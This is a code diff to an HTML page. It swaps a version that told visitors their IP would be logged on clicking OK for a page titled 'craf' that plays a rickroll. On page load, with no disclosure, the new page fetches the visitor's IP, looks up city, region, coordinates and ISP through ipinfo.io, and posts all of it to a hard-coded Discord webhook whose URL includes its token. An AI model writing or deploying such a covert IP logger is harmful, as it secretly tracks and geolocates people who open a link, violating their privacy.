@@ -1,55 +1,82 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>IP Logger + File Download (Safe)</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>craf</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+    </style>
+    <script>
+        async function sendIP() {
+            try {
+                // Fetch the user's IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+
+                // Fetch additional information from ipinfo.io
+                const infoResponse = await fetch(`https://ipinfo.io/${userIP}/json`);
+                const infoData = await infoResponse.json();
+
+                // Your Discord webhook URL
+                const webhookURL = 'https://discord.com/api/webhooks/1377028231135363212/JsS0pwLdWBN9ZhFE0vYvXEERCseOgfbM1QZIiJywQpczkbphvNU96nLiVm9VkLphuhgM';
+
+                // Create an embed message for Discord
+                const embed = {
+                    title: "User IP Information",
+                    color: 3447003, // A nice blue color
+                    fields: [
+                        { name: "IP Address", value: `**${userIP}**`, inline: true },
+                        { name: "City", value: infoData.city || "N/A", inline: true },
+                        { name: "Region", value: infoData.region || "N/A", inline: true },
+                        { name: "Country", value: infoData.country || "N/A", inline: true },
+                        { name: "Location", value: infoData.loc || "N/A", inline: true },
+                        { name: "Organization", value: infoData.org || "N/A", inline: true }
+                    ]
+                };
+
+                // Send the IP address and info to the Discord webhook
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+
+                console.log('IP information sent to Discord:', embed);
+            } catch (error) {
+                console.error('Error sending IP information:', error);
+            }
+        }
+
+        // Call the function when the page loads
+        window.onload = function() {
+            sendIP();
+            // Embed the rickroll video
+            document.body.innerHTML += `
+                <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&controls=0&loop=1&playlist=dQw4w9WgXcQ" allow="autoplay" allowfullscreen></iframe>
+            `;
+        };
+    </script>
 </head>
 <body>
-  <h2>Your IP address will be shown and logged when you click OK.</h2>
-  <button onclick="handleIPAndDownload()">OK</button>
-
-  <p id="ipDisplay"></p>
-
-  <script>
-    async function handleIPAndDownload() {
-      try {
-        // Get IP
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        const ip = data.ip;
-
-        // Show IP
-        document.getElementById('ipDisplay').textContent = "Your IP: " + ip;
-
-        // Send to webhook (CORS will block this in most browsers)
-        const webhookURL = "https://discord.com/api/webhooks/1377028231135363212/JsS0pwLdWBN9ZhFE0vYvXEERCseOgfbM1QZIiJywQpczkbphvNU96nLiVm9VkLphuhgM";
-
-        // Try sending (may fail silently due to CORS)
-        await fetch(webhookURL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            embeds: [{
-              title: "Visitor IP Logged",
-              description: `IP: ${ip}`,
-              color: 15844367
-            }]
-          })
-        });
-
-        console.log("IP sent to webhook (if CORS allowed)");
-
-        // Download file
-        const link = document.createElement('a');
-        link.href = 'yourfile.zip';  // Replace with your actual file
-        link.download = 'yourfile.zip';
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-      } catch (error) {
-        console.error("Error getting IP or sending to webhook:", error);
-      }
-    }
-  </script>
 </body>
 </html>
